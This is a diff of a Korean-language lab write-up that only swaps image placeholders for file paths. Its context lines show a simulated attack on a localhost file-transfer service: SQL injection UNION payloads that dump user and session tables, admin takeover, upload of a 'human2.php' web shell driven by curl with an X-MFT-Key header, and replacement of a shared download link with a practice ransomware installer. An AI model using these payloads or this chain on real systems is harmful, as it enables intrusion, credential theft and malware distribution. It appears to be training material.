@@ -21,9 +21,7 @@ Spidering 및 수동 탐색을 통해 SQL Injection이 가능한 기능을 확�
 http://localhost/guest.php?token=XXXXX
 ```
 
-### 실습 화면
-
-![취약한 기능 확인](null)
+![취약한 기능 확인](<./Image/취약한 기능 확인.png>)
 
 ---
 
@@ -45,9 +43,7 @@ x' UNION SELECT id,username,role FROM users -- -
 %78%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%69%64%2c%75%73%65%72%6e%61%6d%65%2c%72%6f%6c%65%20%46%52%4f%4d%20%75%73%65%72%73%20%2d%2d%20%2d
 ```
 
-### 실습 화면
-
-![users 테이블 조회](null)
+![users 테이블 조회](<./Image/user 테이블 조회.png>)
 
 ---
 
@@ -73,9 +69,7 @@ x' UNION SELECT 0,session_id,user_id FROM sessions -- -
 8c3f6a1d9e42b750c4d2816fa037be95
 ```
 
-### 실습 화면
-
-![sessions 테이블 조회](null)
+![sessions 테이블 조회](<./Image/sessions 테이블 조회.png>)
 
 ---
 
@@ -95,9 +89,7 @@ GET /admin
 
 관리자 페이지 접근 성공을 확인합니다.
 
-### 실습 화면
-
-![관리자 페이지 접근](null)
+![관리자 페이지 접근](<./Image/관리자 페이지 접근.png>)
 
 ---
 
@@ -111,11 +103,9 @@ GET /admin
 
 `human2.php` 파일을 업로드합니다.
 
-### 실습 화면
+![웹쉘 업로드 페이지](<./Image/웹셀 업로드 페이지.png>)
 
-![웹쉘 업로드 페이지](null)
-
-![human2.php 파일 선택](null)
+![human2.php 파일 선택](<./Image/human2파일 선택.png>)
 
 ---
 
@@ -135,11 +125,9 @@ GET /uploads/human2.php?action=XXXXX
 X-MFT-Key: execute
 ```
 
-### 실습 화면
+![웹쉘 접근](<./Image/웹쉘 접근.png>)
 
-![웹쉘 접근](null)
-
-![X-MFT-Key 확인](null)
+![X-MFT-Key 확인](<./Image/X-MFT-Key 확인.png>)
 
 ---
 
@@ -167,9 +155,7 @@ installer.exe
 4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
 ```
 
-### 실습 화면
-
-![files 조회](null)
+![files 조회](<./Image/files 조회.png>)
 
 ---
 
@@ -181,11 +167,9 @@ Admin 계정에서 실습용 랜섬웨어 파일을 업로드합니다.
 
 또한 실습 환경에서는 `human2.php` 웹쉘을 이용할 경우 계정 로그인 없이도 파일 업로드가 가능한 것을 확인했습니다.
 
-### 실습 화면
+![파일 업로드](<./Image/파일 업로드.png>)
 
-![파일 업로드](null)
-
-![업로드 결과](null)
+![업로드 결과](<./Image/업로드 결과.png>)
 
 ---
 
@@ -213,9 +197,7 @@ file_id: 5
 
 기존 파일과 공유 링크의 연결이 끊어지고 새로운 파일이 해당 공유 링크와 연결된 것을 확인합니다.
 
-### 실습 화면
-
-![replace_share 실행](null)
+![replace_share 실행](<./Image/replace_share 실행.png>)
 
 ---
 
@@ -227,9 +209,7 @@ file_id: 5
 GET /uploads/human2.php?action=shares
 ```
 
-### 실습 화면
-
-![shares 조회](null)
+![shares 조회](<./Image/shares 조회.png>)
 
 ---
 
@@ -243,9 +223,7 @@ GET /uploads/human2.php?action=shares
 GET /guest.php?token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
 ```
 
-### 실습 화면
-
-![최종 공유 링크 확인](null)
+![최종 공유 링크 확인](<./Image/최종 공유 링크 확인.png>)
 
 ---
 
@@ -395,12 +373,6 @@ curl -H "X-MFT-Key: $KEY" \
 curl -H "X-MFT-Key: $KEY" \
   "$BASE/uploads/human2.php?action=files"
 ```
-
-### 실습 화면
-
-![curl 실습 결과](null)
-
----
 
 # 3. 전체 실습 흐름
 
